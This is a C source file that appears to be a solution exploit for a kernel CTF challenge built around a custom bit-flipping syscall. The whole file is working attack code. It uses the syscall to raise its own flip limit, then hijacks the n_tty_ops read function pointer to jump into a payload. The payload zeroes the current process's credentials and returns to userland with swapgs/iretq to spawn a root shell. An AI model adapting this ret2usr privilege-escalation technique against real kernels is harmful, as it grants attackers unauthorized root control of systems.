#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

long flitbip(long* addr, long bit)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, 333;"
        "syscall;"
        ".att_syntax;"
    );
}

void get_shell(void)
{
    puts("[*] Returned to userland");
    system("/bin/sh");
}

unsigned long* current_task = 0xffffffff8182e040;
unsigned long* n_tty_ops  = 0xffffffff8183e320;
unsigned long* n_tty_read = 0xffffffff810c8510;

unsigned long user_rip = (unsigned long)get_shell;

void get_root(void)
{
    *(unsigned long*)(n_tty_ops+0x30) = (unsigned long)n_tty_read;

    int* cred = *(unsigned long*)(*current_task + 0x3c0);
    for (int i = 1; i < 7; i++)
        cred[i] = 0;

    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

unsigned long* flip_count = 0xffffffff818f4f78;

int main(void) 
{
    save_state();

    flitbip(flip_count, 63);
    puts("[*] Overwrote flip_count");

    unsigned long val = (unsigned long)get_root ^ (unsigned long)n_tty_read;
    for (unsigned long i = 0; i < 64; i++) 
    {
        if (val & (1ULL << (i)))
            flitbip((char*)n_tty_ops + 0x30 , i);
    }
    puts("[*] Overwrote n_tty_ops");

    char buf[0x200];

    // trigger
    scanf("%c", buf);
    puts("[!] Should never be reached");
}
